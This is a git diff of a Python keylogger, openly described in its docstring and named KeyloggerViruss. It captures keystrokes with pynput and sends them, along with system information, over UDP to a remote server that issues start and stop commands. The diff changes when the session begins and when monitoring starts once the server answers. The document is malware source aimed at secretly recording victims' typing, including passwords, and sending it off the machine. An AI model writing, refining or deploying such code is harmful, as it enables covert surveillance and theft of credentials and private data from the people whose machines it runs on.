@@ -6,13 +6,12 @@ data: 14.10.2025
 This script implements a keylogger that listens for UDP commands to start and stop logging keystrokes.
 When started, it captures keystrokes and sends them via UDP to a specified server.
 """
-import signal
 
-from pyexpat.errors import messages
+
 from pynput.keyboard import Listener
 import socket
 import json
-from typing import Optional, Dict
+import time
 from config import special_keys, IP
 from utils import get_all_local_ips, get_system_info
 
@@ -79,7 +78,7 @@ class KeyloggerViruss():
         print("Keyboard monitor STOPPED")
 
     def start_session(self):
-        self.start_monitor()
+        # self.start_monitor()
         message = get_system_info(target_ip=IP)
         self.send_udp_message(message=message, signal=True)
 
@@ -94,15 +93,15 @@ class KeyloggerViruss():
         try:
             while True:
                 try:
-                    if not self.is_active_server:
-                        self.start_session()
-
-
                     data, _ = sock.recvfrom(buffer_size)
                     data = json.loads(data.decode())
+                    if not self.is_active_server:
+                        self.start_session()
+                        time.sleep(0.1)
 
                     if data.get("command", "") == "Server_active":
                         self.is_active_server = True
+                        self.start_monitor()
                     elif data.get("command", "") == "start":
                         self.start_monitor()
                     elif data.get("command", "") == "stop":
